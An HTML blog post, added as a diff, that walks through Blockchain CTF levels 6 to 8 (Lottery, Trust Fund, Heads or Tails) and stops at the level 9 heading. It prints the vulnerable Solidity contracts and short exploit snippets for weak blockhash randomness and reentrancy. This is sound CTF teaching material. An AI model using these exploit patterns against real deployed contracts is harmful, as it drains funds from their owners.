@@ -1,0 +1,653 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="author" content="F3real" />
+        <meta name="keywords" content="ctf,ethereum,solidity" />
+        <meta name="description" content="How to solve Blockchain CTF lvl. 6-9" />
+
+
+    <title>Blockchain CTF Lvl. 6-9 - EnSec blog</title>
+
+    <link href="https://f3real.github.io/theme/css/combined.css" rel="stylesheet" />
+
+    <!-- Feeds -->
+</head>
+<body data-spy="scroll" data-target="#scrollspy">
+    <div id="wrapper">
+        <!-- Sidebar -->
+        <nav id="sidebar-wrapper-small" class="twitchy-background">
+            <ul id="accordion-small" class="sidebar-nav sidebar-nav-small">
+                <li>
+        <a href="https://f3real.github.io" title="EnSec blog" class="collapsed">
+            <span class="fas fa-home"></span>
+        </a>
+    </li>
+                <li class="nav-divider"></li>
+                <li>
+        <a href="https://f3real.github.io/archives.html" title="Recent Articles" class="collapsed">
+            <span class="fas fa-th-list"></span>
+        </a>
+    </li>
+                <li class="nav-divider"></li>
+                <li>
+                    <a data-toggle="collapse" data-parent="#accordion-small" href="#collapse-social-small" title="Social" class="collapsed">
+                        <i class="fas fa-users padding-small"></i>
+                    </a>
+                </li>
+                <li class="panel anti-panel"><ul id="collapse-social-small" class="collapse ">
+                    <li>
+                        <a href="https://github.com/F3real" title="Github"><i class="fab fa-github-square padding-small"></i></a>
+                    </li>
+                    <li>
+                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin"><i class="fab fa-linkedin padding-small"></i></a>
+                    </li>
+                </ul></li>
+                <li class="nav-divider"></li>
+                <li>
+        <a href="#" title="Back to top" class="collapsed">
+            <span class="fas fa-arrow-up"></span>
+        </a>
+    </li>
+            </ul>
+        </nav>
+        <nav id="sidebar-wrapper" class="twitchy-background">
+            <ul id="accordion" class="sidebar-nav">
+                <li class="sidebar-brand">
+                    <a href="https://f3real.github.io/">
+                            <span class="fas fa-home padding-small"></span>
+                            EnSec blog
+                    </a>
+                </li>
+                    <li>
+                        <a href="https://f3real.github.io/archives.html">
+                            <span class="fas fa-th-list padding-small"></span>
+                            Archives
+                        </a>
+                    </li>
+                <li class="nav-divider"></li>
+                <li>
+                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-social">
+                        <i class="fas fa-users padding-small"></i>
+                        Contact
+                    </a>
+                </li>
+                <li class="panel anti-panel"><ul id="collapse-social" class="sidebar_submenu collapse ">
+                    <li>
+                        <a href="https://github.com/F3real" title="Github">
+                            <i class="fab fa-github-square padding-small"></i>
+                            Github
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin">
+                            <i class="fab fa-linkedin padding-small"></i>
+                            Linkedin
+                        </a>
+                    </li>
+                </ul></li>
+                
+                <li class="nav-divider"></li>
+                <li class="panel anti-panel"><ul id="collapse-pages" class="sidebar_submenu collapse ">
+                </ul></li>
+                <li class="nav-divider"></li>
+                <li>
+                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-categories">
+                        <i class="fas fa-folder-open padding-small"></i>
+                        Categories
+                    </a>
+                </li>
+                <li class="panel anti-panel"><ul id="collapse-categories" class="sidebar_submenu collapse ">
+                    <li class="active">
+                        <a href="https://f3real.github.io/category/ctf.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            ctf
+                            <span class="badge badge-secondary float-right categorybadge">28</span>
+                        </a>
+                    </li>
+                    <li >
+                        <a href="https://f3real.github.io/category/misc.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            misc
+                            <span class="badge badge-secondary float-right categorybadge">15</span>
+                        </a>
+                    </li>
+                    <li >
+                        <a href="https://f3real.github.io/category/reversing.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            reversing
+                            <span class="badge badge-secondary float-right categorybadge">6</span>
+                        </a>
+                    </li>
+                    <li >
+                        <a href="https://f3real.github.io/category/tutorial.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            tutorial
+                            <span class="badge badge-secondary float-right categorybadge">5</span>
+                        </a>
+                    </li>
+                </ul></li>
+            </ul>
+        </nav>
+        <!-- /#sidebar-wrapper -->
+        <!-- open/close sidebar -->
+        <button onclick="toggleMenu();return false;" class="btn btn-primary" id="menu-toggle">
+            <span id="right-arrow" class="fas fa-chevron-right"  title="expand sidebar"></span>
+            <span id="left-arrow" class="fas fa-chevron-left" title="minimize sidebar"></span>
+        </button>
+       <!-- /open/close sidebar -->
+
+        <!-- Page Content -->
+        <div id="page-content-wrapper">
+            <div class="container-fluid">
+<section id="content">
+    <article>
+        <div class="row">
+            <div class="col-lg-10">
+                <header class="page-header">
+                    <h1>
+                        <a href="https://f3real.github.io/blockchain_ctf69.html"
+                           rel="bookmark"
+                           title="Permalink to Blockchain CTF Lvl. 6-9">
+                            Blockchain CTF Lvl. 6-9
+                        </a>
+                        <small>
+<div class="post-info">
+    <div class="publish-info-block">
+        <small>
+            <span class="published">
+                <i class="fa fa-calendar padding-small"></i><time datetime="2018-12-19T10:01:00+01:00"> Wed 19 December 2018</time>
+            </span>
+            <span class="category">
+                <i class="fa fa-folder-open padding-small"></i><a href="https://f3real.github.io/category/ctf.html">ctf</a>
+            </span>
+            <span class="tags">
+                <i class="fa fa-tags padding-small"></i>
+                <a href="https://f3real.github.io/tag/ctf.html">ctf</a> /                 <a href="https://f3real.github.io/tag/ethereum.html">ethereum</a> /                 <a href="https://f3real.github.io/tag/solidity.html">solidity</a>            </span>
+        </small>
+    </div>
+</div><!-- /.post-info -->                        </small>
+                    </h1>
+                </header>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-lg-10">
+                <div class="entry-content">
+                    <p>In this post, we will take a look at challenges from 6 to 9.
+To solve these challenges we will use <a href="https://remix.ethereum.org">Remix</a>, an online IDE for solidity. It will also enable us to publish new contracts and interact with them (or other preexisting contracts).</p>
+<p>Useful tools to analyse contracts for vulnerabilities and bad practices:</p>
+<ul>
+<li><a href="https://tool.smartdec.net/?">SmartScan</a></li>
+<li><a href="https://github.com/ConsenSys/mythril-classic">Mythril</a></li>
+</ul>
+<p>In my experience, SmartScan provided better results but both tools are useful to know.</p>
+<p>So let's start:</p>
+<div class="toc">
+<ul>
+<li><a href="#lvl-6-lottery">Lvl 6 Lottery</a></li>
+<li><a href="#lvl-7-trust-fund">Lvl 7 Trust Fund</a></li>
+<li><a href="#lvl-8-heads-or-tails">Lvl 8 Heads or Tails</a></li>
+<li><a href="#lvl-9-record-label">Lvl 9 Record Label</a></li>
+</ul>
+</div>
+<h2 id="lvl-6-lottery">Lvl 6 Lottery</h2>
+<p>Let's take a look at the source:</p>
+<div class="highlight"><pre><span></span><code><span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.4.24</span><span class="p">;</span>
+
+<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;../CtfFramework.sol&quot;</span><span class="p">;</span>
+<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol&quot;</span><span class="p">;</span>
+
+<span class="k">contract</span><span class="w"> </span><span class="ni">Lottery</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>CtfFramework<span class="p">{</span>
+<span class="w">    </span>using<span class="w"> </span>SafeMath<span class="w"> </span><span class="kt">for</span><span class="w"> </span><span class="kt">uint256</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">totalPot</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_ctfLauncher</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">_player</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span>
+<span class="w">        </span>CtfFramework<span class="p">(</span>_ctfLauncher<span class="p">,</span><span class="w"> </span>_player<span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span>totalPot<span class="w"> </span><span class="o">=</span><span class="w"> </span>totalPot<span class="p">.</span>add<span class="p">(</span><span class="k">msg.value</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>ctf<span class="p">{</span>
+<span class="w">        </span>totalPot<span class="w"> </span><span class="o">=</span><span class="w"> </span>totalPot<span class="p">.</span>add<span class="p">(</span><span class="k">msg.value</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">play</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_seed</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>ctf<span class="p">{</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="w"> </span>finney<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Insufficient Transaction Value&quot;</span><span class="p">);</span>
+<span class="w">        </span>totalPot<span class="w"> </span><span class="o">=</span><span class="w"> </span>totalPot<span class="p">.</span>add<span class="p">(</span><span class="k">msg.value</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">entropy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>blockhash<span class="p">(</span><span class="k">block.number</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">entropy2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">keccak256</span><span class="p">(</span>abi<span class="p">.</span>encodePacked<span class="p">(</span><span class="k">msg.sender</span><span class="p">));</span>
+<span class="w">        </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">keccak256</span><span class="p">(</span>abi<span class="p">.</span>encodePacked<span class="p">(</span>entropy<span class="o">^</span>entropy2<span class="p">));</span>
+<span class="w">        </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">guess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">keccak256</span><span class="p">(</span>abi<span class="p">.</span>encodePacked<span class="p">(</span>_seed<span class="p">));</span>
+<span class="w">        </span><span class="kt">if</span><span class="p">(</span>guess<span class="o">==</span>target<span class="p">){</span>
+<span class="w">            </span><span class="c1">//winner</span>
+<span class="w">            </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">payout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>totalPot<span class="p">;</span>
+<span class="w">            </span>totalPot<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
+<span class="w">            </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span>payout<span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span><span class="w">    </span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Vulnerability is that the contract is using <code>block.blockhash(block.number)</code> as source of entropy.
+When a transaction gets executed in the EVM, the blockhash of the block that is being created is still unknown and EVM will always yield zero. Block number only  becomes known when miner picks up a transaction that executes contract code.</p>
+<p>Knowing this we see, that our <code>_seed</code> should actually only be equal to <code>keccak256(abi.encodePacked(msg.sender))</code> (since xor with 0 has no effect).</p>
+<p>To win we just need to call function <code>play</code> with correct seed and value of 1 finney.</p>
+<p>Easy way to get required seed is to deploy test contract just giving back required value:</p>
+<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">getSeed</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>view<span class="p">{</span>
+<span class="w">        </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">entropy2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">keccak256</span><span class="p">(</span>abi<span class="p">.</span>encodePacked<span class="p">(</span><span class="k">msg.sender</span><span class="p">));</span>
+<span class="w">        </span><span class="kt">return</span><span class="w"> </span>entropy2<span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+</code></pre></div>
+
+<p>Modifer <code>view</code> indicates that the function will not alter the storage state in any way.</p>
+<p>We can also use javascript to get same result:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">web3</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="nx">ourAddressString</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">encoding</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;hex&#39;</span><span class="p">})</span>
+</code></pre></div>
+
+<h2 id="lvl-7-trust-fund">Lvl 7 Trust Fund</h2>
+<div class="highlight"><pre><span></span><code><span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.4.24</span><span class="p">;</span>
+
+<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;../CtfFramework.sol&quot;</span><span class="p">;</span>
+<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol&quot;</span><span class="p">;</span>
+
+<span class="k">contract</span><span class="w"> </span><span class="ni">TrustFund</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>CtfFramework<span class="p">{</span>
+<span class="w">    </span>using<span class="w"> </span>SafeMath<span class="w"> </span><span class="kt">for</span><span class="w"> </span><span class="kt">uint256</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">allowancePerYear</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">startDate</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">numberOfWithdrawls</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="k">public </span><span class="nv">withdrewThisYear</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">public </span><span class="nv">custodian</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_ctfLauncher</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">_player</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span>
+<span class="w">        </span>CtfFramework<span class="p">(</span>_ctfLauncher<span class="p">,</span><span class="w"> </span>_player<span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span>custodian<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
+<span class="w">        </span>allowancePerYear<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.value</span><span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">10</span><span class="p">);</span><span class="w">        </span>
+<span class="w">        </span>startDate<span class="w"> </span><span class="o">=</span><span class="w"> </span>now<span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">checkIfYearHasPassed</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="p">{</span>
+<span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>now<span class="o">&gt;=</span>startDate<span class="w"> </span><span class="o">+</span><span class="w"> </span>numberOfWithdrawls<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">365</span><span class="w"> </span>days<span class="p">){</span>
+<span class="w">            </span>withdrewThisYear<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">withdraw</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>ctf<span class="p">{</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>allowancePerYear<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;No Allowances Allowed&quot;</span><span class="p">);</span>
+<span class="w">        </span>checkIfYearHasPassed<span class="p">();</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="o">!</span>withdrewThisYear<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Already Withdrew This Year&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="p">.</span>call<span class="p">.</span>value<span class="p">(</span>allowancePerYear<span class="p">)()){</span>
+<span class="w">            </span>withdrewThisYear<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span>
+<span class="w">            </span>numberOfWithdrawls<span class="w"> </span><span class="o">=</span><span class="w"> </span>numberOfWithdrawls<span class="p">.</span>add<span class="p">(</span><span class="m m-Decimal">1</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">returnFunds</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>ctf<span class="p">{</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>allowancePerYear<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Incorrect Transaction Value&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>withdrewThisYear<span class="o">==</span><span class="kt">true</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Cannot Return Funds Before Withdraw&quot;</span><span class="p">);</span>
+<span class="w">        </span>withdrewThisYear<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
+<span class="w">        </span>numberOfWithdrawls<span class="o">=</span>numberOfWithdrawls<span class="p">.</span>sub<span class="p">(</span><span class="m m-Decimal">1</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>This time we have one of the classic solidity vulnerabilities, reentrancy.
+In solidity we have a few different ways to call other contracts:</p>
+<ul>
+<li>
+<p><code>&lt;address&gt;.send(x)</code>
+    Only 2300 Gas is passed for calls to prevent reentrancy. Returns <code>false</code> in case of failure.</p>
+</li>
+<li>
+<p><code>&lt;address&gt;.transfer(x)</code>
+    Only 2300 Gas is passed for calls to prevent reentrancy. In case of failure, it automatically reverts. Equivalent to <code>require(&lt;address&gt;.send(x));</code></p>
+</li>
+<li>
+<p><code>&lt;address&gt;.call.value(x)()</code>
+    The executed code is given all available gas and is vulnerable to reentrancy.
+    We can manually limit amount of gas sent with <code>&lt;address&gt;.call.value(x).gas(gasAmount)()</code></p>
+</li>
+</ul>
+<p>In function <code>withdraw</code> we see that the gas limit is not set and that <code>withdrewThisYear</code> flag is only being set after call returns.</p>
+<div class="highlight"><pre><span></span><code>                Trust Fund     Attacker contract
+
+                +------------+
+                |call() +----|-----------+
+                |withdraw set|           |
+                +------------+           |
+                                 +-------v-------+
+                      +--------+ | call withdraw |
+                      |          +---------------+
+                +-----v------+
+                |call() +----|-----------+
+                |withdraw set|           |
+                +------------+           |
+                                 +-------v-------+
+                      +--------+ | call withdraw |
+                      |          +---------------+
+                +-----v------+
+                |call()      |
+                |withdraw set|
+                +------------+
+</code></pre></div>
+
+<p>We can write a contract that will have a fallback function which calls <code>withdraw()</code>. This will create a loop, allowing us to withdraw all eth before <code>withdrewThisYear</code> gets set.
+We just need to pass enough gas in the first call we make to start the loop. For example in my transaction:</p>
+<div class="highlight"><pre><span></span><code>Gas Limit: 300000
+Gas Used By Transaction: 195406 (65.14%)
+Gas Price: 0.000000001 Ether (1 Gwei) 
+</code></pre></div>
+
+<p>Part of exploit contract:</p>
+<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">trustAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x466802CE70Fba9865AE8Ce9e7a0A480FC84B7917</span><span class="p">;</span>
+<span class="w">    </span><span class="c1">//fallback function</span>
+<span class="w">    </span><span class="kt">function</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span>TrustFund<span class="w"> </span>trust<span class="w"> </span><span class="o">=</span><span class="w"> </span>TrustFund<span class="p">(</span>trustAddr<span class="p">);</span>
+<span class="w">        </span>trust<span class="p">.</span>withdraw<span class="p">();</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">getTrustMoney</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="p">{</span>
+<span class="w">        </span>TrustFund<span class="w"> </span>trust<span class="w"> </span><span class="o">=</span><span class="w"> </span>TrustFund<span class="p">(</span>trustAddr<span class="p">);</span>
+<span class="w">        </span>trust<span class="p">.</span>withdraw<span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>Just don't forget to write withdraw function so you are able to get your eth back.</p>
+<p>Also to note, before any contract can interact with CTF contracts we need to add his address to list of allowed. We do it trough <code>CtfFramework</code> contract and its <code>ctf_challenge_add_authorized_senderctf_challenge_add_authorized_sender</code> function.</p>
+<h2 id="lvl-8-heads-or-tails">Lvl 8 Heads or Tails</h2>
+<div class="highlight"><pre><span></span><code><span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.4.24</span><span class="p">;</span>
+
+<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;../CtfFramework.sol&quot;</span><span class="p">;</span>
+<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol&quot;</span><span class="p">;</span>
+
+<span class="k">contract</span><span class="w"> </span><span class="ni">HeadsOrTails</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>CtfFramework<span class="p">{</span>
+<span class="w">    </span>using<span class="w"> </span>SafeMath<span class="w"> </span><span class="kt">for</span><span class="w"> </span><span class="kt">uint256</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">gameFunds</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">cost</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_ctfLauncher</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">_player</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span>
+<span class="w">        </span>CtfFramework<span class="p">(</span>_ctfLauncher<span class="p">,</span><span class="w"> </span>_player<span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span>gameFunds<span class="w"> </span><span class="o">=</span><span class="w"> </span>gameFunds<span class="p">.</span>add<span class="p">(</span><span class="k">msg.value</span><span class="p">);</span>
+<span class="w">        </span>cost<span class="w"> </span><span class="o">=</span><span class="w"> </span>gameFunds<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">10</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">play</span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">_heads</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>ctf<span class="p">{</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>cost<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Incorrect Transaction Value&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span>gameFunds<span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>cost<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">2</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;Insufficient Funds in Game Contract&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">entropy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>blockhash<span class="p">(</span><span class="k">block.number</span><span class="o">-</span><span class="m m-Decimal">1</span><span class="p">);</span>
+<span class="w">        </span>bytes1<span class="w"> </span>coinFlip<span class="w"> </span><span class="o">=</span><span class="w"> </span>entropy<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">((</span>coinFlip<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>_heads<span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span>coinFlip<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span>_heads<span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">//win</span>
+<span class="w">            </span>gameFunds<span class="w"> </span><span class="o">=</span><span class="w"> </span>gameFunds<span class="p">.</span>sub<span class="p">(</span><span class="k">msg.value</span><span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">2</span><span class="p">));</span>
+<span class="w">            </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span><span class="k">msg.value</span><span class="p">.</span>mul<span class="p">(</span><span class="m m-Decimal">3</span><span class="p">).</span>div<span class="p">(</span><span class="m m-Decimal">2</span><span class="p">));</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">//loser</span>
+<span class="w">            </span>gameFunds<span class="w"> </span><span class="o">=</span><span class="w"> </span>gameFunds<span class="p">.</span>add<span class="p">(</span><span class="k">msg.value</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>This time contract is using <code>block.blockhash(block.number-1)</code> as a source of entropy which at first looks better.</p>
+<p>But this approach is also flawed: an attacker can make an exploit contract with the same random number generating code in order to call the contract via an internal message. The "random" numbers for the two contracts will be the same.</p>
+<p>This happens since both calls will be done in the same block. We can write our attack function as follows:</p>
+<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">guess</span><span class="p">()</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="kt">external</span><span class="p">{</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">10</span><span class="w"> </span>ether<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Incorrect Transaction Value&quot;</span><span class="p">);</span>
+<span class="w">        </span>HeadsOrTails<span class="w"> </span>headsOrTails<span class="w"> </span><span class="o">=</span><span class="w"> </span>HeadsOrTails<span class="p">(</span>headsOrTailsAddr<span class="p">);</span>
+<span class="w">        </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">entropy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>blockhash<span class="p">(</span><span class="k">block.number</span><span class="o">-</span><span class="m m-Decimal">1</span><span class="p">);</span>
+<span class="w">        </span>bytes1<span class="w"> </span>coinFlip<span class="w"> </span><span class="o">=</span><span class="w"> </span>entropy<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>coinFlip<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span>headsOrTails<span class="p">.</span>play<span class="p">.</span>value<span class="p">(</span><span class="k">msg.value</span><span class="p">)(</span><span class="kt">true</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span>headsOrTails<span class="p">.</span>play<span class="p">.</span>value<span class="p">(</span><span class="k">msg.value</span><span class="p">)(</span><span class="kt">false</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>Don't forget fallback function so our contract can receive eth as well as withdraw function.</p>
+<h2 id="lvl-9-record-label">Lvl 9 Record Label</h2>
